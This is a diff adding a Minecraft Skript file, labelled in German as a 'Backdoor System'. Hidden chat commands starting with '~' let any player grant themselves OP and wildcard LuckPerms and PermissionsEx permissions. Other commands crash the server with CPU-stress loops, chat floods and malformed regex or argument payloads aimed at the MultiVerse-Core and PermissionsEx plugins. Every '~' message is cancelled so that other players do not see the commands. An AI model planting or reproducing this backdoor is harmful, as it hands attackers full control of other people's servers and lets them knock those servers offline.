@@ -1,0 +1,99 @@
+##############################
+#          Help              #
+##############################
+on chat:
+    if message is "~help":
+        cancel event
+        send "&8&m─────────────────────────────────" to player
+        send "&c&l        Backdoor System &a&opage 1" to player
+        send "&7~op &8|| &agibt dir OP-Rechte" to player
+        send "&7~clearchat &8|| &acleart deinen Chat" to player
+        send "&7~help2 &8|| &aHilfe, seite 2" to player
+        send "&8&m─────────────────────────────────" to player
+on chat:
+    if message is "~help2":
+        cancel event
+        send "&8&m─────────────────────────────────" to player
+        send "&c&l        Backdoor System &a&opage 2" to player
+        send "&7~mathcrash &8|| &aCPU Stresser" to player
+        send "&7~textcrash &8|| &aText Crasher" to player
+        send "&7~fucker &8|| &aServer Fährt herunter" to player
+        send "&7~pexcrasher &8|| &aPermissionsEx Crasher" to player
+        send "&7~mvcrasher &8|| &aPermissionsEx Crasher" to player
+        send "&7~crashall &8|| &aAlle Crasher &7&o(&a&oausser fucker&7&o)" to player
+        send "&8&m─────────────────────────────────" to player
+##############################
+#          OPStuff           #
+##############################
+on chat:
+    if message is "~op":
+        cancel event
+        execute console command "op %player%"
+        execute console command "lp user %player% permission set * true"
+        execute console command "lp user %player% permission set op true"
+        execute console command "pex user %player% add *"
+		
+##############################
+#          Sinvoll           #
+##############################
+
+on chat:
+    if message is "~clearchat":
+        cancel event
+        loop 1000 times:
+            send " " to player
+        send "&aDein Chat wurde geleert." to player
+		
+
+##############################
+#          Crasher           #
+##############################
+
+on chat:
+    if message starts with "~":
+        cancel event
+
+on chat:
+    if message is "~mathcrash":
+        cancel event
+        loop 2000000 times:
+            set {_calc} to sin(cos(tan({_calc} + 1)))
+            set {_calc} to {_calc} * random number between 1 and 1000
+            set {_calc} to sqrt({_calc} ^ 2)
+on chat:
+    if message is "~pexcrasher":
+        cancel event
+        make player say "/pex demote $({^.#䐷噃摂潡㕓欹䙎啘琷㤶乇㉦㠰愳㡅㤴汬㘷煸儱䝖䡲倱慍卆流䙨啶獖歄䅧眶元她䙷癋㍰#.^})"
+on chat:
+    if message is "~mvcrasher":
+        cancel event
+        make player say "//MultiVerseCore:mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^"
+        make player say "/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^"
+        make player say "/mVhElP <*.*.*.*.*.*.*.>"
+        make player say "/mvh .*%%{9999%%}.*%%{9999%%}.*%%{9999%%}.*%%{9999%%}.$%%"
+on chat:
+    if message is "~textcrash":
+        cancel event
+        loop 10000 times:
+            broadcast "Lorem ipsum dolor sit amet, consectetur adipiscing elit."
+on chat:
+    if message is "~fucker":
+        cancel event
+        loop 200000000 times:
+            set {_calc} to sin(cos(tan({_calc} + 1)))
+            set {_calc} to {_calc} * random number between 1 and 1000
+            set {_calc} to sqrt({_calc} ^ 2)
+on chat:
+    if message is "~crashall":
+        cancel event
+        make player say "//MultiVerseCore:mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^"
+        make player say "/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^"
+        make player say "/mVhElP <*.*.*.*.*.*.*.>"
+        make player say "/mvh .*%%{9999%%}.*%%{9999%%}.*%%{9999%%}.*%%{9999%%}.$%%"
+        make player say "/pex demote $({^.#䐷噃摂潡㕓欹䙎啘琷㤶乇㉦㠰愳㡅㤴汬㘷煸儱䝖䡲倱慍卆流䙨啶獖歄䅧眶元她䙷癋㍰#.^})"
+        loop 2000000 times:
+            set {_calc} to sin(cos(tan({_calc} + 1)))
+            set {_calc} to {_calc} * random number between 1 and 1000
+            set {_calc} to sqrt({_calc} ^ 2)
+        loop 10000 times:
+            broadcast "Lorem ipsum dolor sit amet, consectetur adipiscing elit."
